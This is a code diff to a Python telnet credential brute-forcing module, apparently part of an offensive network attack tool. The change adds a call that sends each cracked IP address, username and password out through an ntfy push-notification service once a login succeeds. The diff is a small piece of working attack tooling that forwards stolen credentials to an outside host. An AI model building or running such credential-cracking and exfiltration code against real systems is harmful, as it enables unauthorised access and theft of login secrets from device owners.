@@ -14,6 +14,7 @@ from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="telnet_connector.py", level=logging.DEBUG)
@@ -124,6 +125,8 @@ class TelnetConnector:
                     logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
                     self.save_results()
                     self.removeduplicates()
+                    message = f"Found Telnet credentials | IP: {adresse_ip} | User: {user} | Password: {password}"
+                    send_ntfy(message=message)
                     success_flag[0] = True
             self.queue.task_done()
             progress.update(task_id, advance=1)
